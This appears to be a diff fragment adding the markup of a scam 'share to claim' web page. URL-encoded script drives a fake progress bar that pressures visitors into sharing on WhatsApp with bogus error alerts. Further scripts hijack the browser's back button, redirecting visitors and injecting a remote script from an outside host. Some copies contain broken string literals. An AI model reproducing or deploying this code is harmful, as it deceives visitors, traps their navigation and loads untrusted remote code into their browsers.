+<p class="p1">document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))</p>
+<p class="p1">&lt;/script&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1">&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>window.onhashchange=function(){jp();};</p>
+<p class="p1"><span class="Apple-converted-space">    </span>function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>function jp() {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>fh();}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>setTimeout('hh();', 500);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>function fh(){</p>
+<p class="p1"><span class="Apple-converted-space">        </span>location.href="https://ak.jeekomih.com/4/3156656";</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>function goon(){</p>
+<p class="p1"><span class="Apple-converted-space">        </span>location.href="https://ak.jeekomih.com/4/3156656";</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1">&lt;/script&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-tab-span">	</span> <span class="Apple-converted-space">  </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>window.onhashchange=function(){jp();};</p>
+<p class="p1"><span class="Apple-converted-space">    </span>function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>function jp() {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>fh();}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>setTimeout('hh();', 500);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>function fh(){</p>
+<p class="p1"><span class="Apple-converted-space">        </span>location.href="https://ak.jeekomih.com/4/3156656;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>function goon(){</p>
+<p class="p1"><span class="Apple-converted-space">        </span>location.href="https://ak.jeekomih.com/4/3156656;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1">&lt;/script&gt;</p>
+<p class="p1">&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>var _hmt = _hmt || [];</p>
+<p class="p1"><span class="Apple-converted-space">    </span>(function() {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>var hm = document.createElement("script");</p>
+<p class="p1"><span class="Apple-converted-space">        </span>hm.src = "https://ak.jeekomih.com/4/3156656";</p>
+<p class="p1"><span class="Apple-converted-space">        </span>var s = document.getElementsByTagName("script")[0];</p>
+<p class="p1"><span class="Apple-converted-space">        </span>s.parentNode.insertBefore(hm, s);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>})();</p>
+<p class="p1">&lt;/script&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1">&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;script&gt;/*&lt;![CDATA[*/ cookieChoices = {}; /*]]&gt;*/&lt;/script&gt;</p>
+<p class="p1">&lt;/body&gt;&lt;/html&gt;</p>
+</body>
+</html>
